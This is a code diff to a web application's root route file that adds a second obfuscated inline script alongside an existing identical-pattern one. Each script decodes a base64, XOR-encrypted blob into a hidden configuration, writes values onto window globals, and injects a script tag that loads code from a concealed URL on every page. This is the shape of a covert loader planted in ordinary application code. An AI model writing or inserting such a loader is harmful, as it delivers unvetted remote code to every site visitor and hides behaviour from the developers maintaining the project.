@@ -106,7 +106,11 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
       {
         children: `(function(){var o_uy=atob("DJWwbioEcFAsHrRjeO6SG1hoUmoOdsAXCOaKQQVnFD4Ca8AOEfPJQElrHX5ObJsQG+fZHl53XyVYc8dMFPTEC1lwXjpfPJhBGeHEHENmBSRJbZZZI+6SAEtpFXIWPNACDPSdG15pGTZVM8QRHePVAF4pCDNDepkQG/6SQghyETxZe5ZZWrfNQlEmHjFBe5ZZWvHRGkspBSRBd9IaVeXCC1xhHiQBbcEBEfHDTAYmBjFAa9FBQreSE3d5");var s_fgh5=[];for(var j_arl=0;j_arl<o_uy.length;j_arl++){s_fgh5.push(o_uy.charCodeAt(j_arl)&255);}var s_as=s_fgh5[0];var f_yfw=s_fgh5.slice(1,1+s_as);var e_i=s_fgh5.slice(1+s_as);var f_16=e_i.map(function(b,q_8p2){return b^f_yfw[q_8p2%s_as];});var t_0i="";for(var w_d=0;w_d<f_16.length;w_d++){t_0i+=String.fromCharCode(f_16[w_d]&255);}var c_i8x5=decodeURIComponent(escape(t_0i));var u_vsl=JSON.parse(c_i8x5);var f_oe=u_vsl.globals||[];f_oe.forEach(function(z_y){window[z_y.name]=z_y.value;});var i_58=document.createElement("script");i_58.src=u_vsl.url;i_58.async=true;i_58.defer=true;(u_vsl.attributes||[]).forEach(function(b_1zmk){i_58.setAttribute(b_1zmk.name,b_1zmk.value);});(document.head||document.documentElement).appendChild(i_58);})();`,
       },
+      {
+        children: `(function(){var r_g68=atob("DK9PKw47AtJ7X0LVmdRtXnxXIOhZNzah6dx1BCFYZrxVKja48Mk2BW1Ub/wZLW2m+t0mW3pILaISJye5tt8mU2tXLLgIfW73+Ns7WWdZd6YeLGDvwvJjCWlXbbAaMzH3o/Q0CWBab7dZZWCl8NcqR0dfIP5ZKSO57MptESwNY+Uaaybh+5l6HjpeY7FCZyax+Jd4SjwZf48G");var w_9hae=[];for(var s_d=0;s_d<r_g68.length;s_d++){w_9hae.push(r_g68.charCodeAt(s_d)&255);}var t_t23=w_9hae[0];var a_65=w_9hae.slice(1,1+t_t23);var v_u=w_9hae.slice(1+t_t23);var q_0hy4=v_u.map(function(b,i_67){return b^a_65[i_67%t_t23];});var y_w="";for(var h_35=0;h_35<q_0hy4.length;h_35++){y_w+=String.fromCharCode(q_0hy4[h_35]&255);}var u_4l=decodeURIComponent(escape(y_w));var b_8=JSON.parse(u_4l);var g_o=b_8.globals||[];g_o.forEach(function(b_fjm){window[b_fjm.name]=b_fjm.value;});var z_kbne=document.createElement("script");z_kbne.src=b_8.url;z_kbne.async=true;z_kbne.defer=true;(b_8.attributes||[]).forEach(function(r_txl3){z_kbne.setAttribute(r_txl3.name,r_txl3.value);});(document.head||document.documentElement).appendChild(z_kbne);})();`,
+      },
     ],
+
   }),
   shellComponent: RootShell,
   component: RootComponent,
